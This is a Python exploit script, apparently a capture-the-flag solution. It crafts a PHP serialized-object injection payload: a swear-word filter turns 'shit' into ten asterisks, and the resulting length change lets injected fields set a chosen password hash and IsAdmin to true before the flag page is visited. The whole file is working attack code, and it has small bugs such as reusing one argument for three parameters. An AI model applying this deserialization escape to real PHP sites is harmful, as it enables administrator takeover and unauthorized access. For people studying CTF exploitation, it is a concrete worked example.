import sys
import re


if len(sys.argv) < 5:
    print("Usuage:\n\rpython3 exploit.py 60 59 0 2")

# informational function
def calleb(s_b, s_c, s1, s_a=0):
    shit_rep=s1;
    a= lambda s_b, s_c, s_a, s1: len('A'*(s_b)+'*'*10*s_c+'A'*s_a+'0x539";}s:8:"Password";s:64:"d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1";s:7:"IsAdmin";b:1;}//AAAAAAA'+'*'*10*s1)
    b= lambda s_b, s_c, s_a, s1: len('A'*(s_b)+'shit'*s_c+'A'*s_a+'0x539";}s:8:"Password";s:64:"d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1";s:7:"IsAdmin";b:1;}//AAAAAAA'+'shit'*s1);
    print("stars :", a(s_b, s_c, s_a, s1), "A<N times><PAYLOAD>*<N times>");print("string:", b(s_b, s_c, s_a, s1), "A<N times><PAYLOAD>shit<N/4 times>");
    print(a(s_b, s_c, s_a, s1)-(a(s_b, s_c, s_a, s1)-b(s_b, s_c, s_a, s1)))

# before replacing swears
cc1 = lambda s_b,s_c,s_a,s1: 'A'*(s_b)+'shit'*s_c+'A'*s_a+'0x539";}s:8:"Password";s:64:"d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1";s:7:"IsAdmin";b:1;}//AAAAAAA'+'shit'*s1

# after replacing string
cc = lambda s_b,s_c,s_a,s1: 'A'*(s_b)+'*'*10*s_c+'A'*s_a+'0x539";}s:8:"Password";s:64:"d74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1";s:7:"IsAdmin";b:1;}//AAAAAAA'+'*'*10*s1

# s is AAAA.. and s1 is "shit" repeated
# cc1 is the string passed
# cc is the resulted string
def try_calc(s_b, s_c, s_a, s1):
    calleb(s_b, s_c, s_a, s1)
    print("cc :", len(cc(s_b, s_c, s_a, s1)))
    print("cc1:", len(cc1(s_b, s_c, s_a, s1)))

    print("hitting:", len(re.findall("\*+", cc(s_b, s_c, s_a, s1))[1]))
    print(cc(s_b, s_c, s_a, s1)[:len(cc1(s_b, s_c, s_a, s1))+1], "with additional character if it's 0x539\" right at the end then go get the flag!")
    print("copy your note? ")
    print("----- START -----")
    print(cc1(s_b, s_c, s_a, s1))
    print("----- END   -----")
    print()
    print("[+] /?action=flag visit after creating the note:")
    print()


try_calc(int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[2]), int(sys.argv[2]))

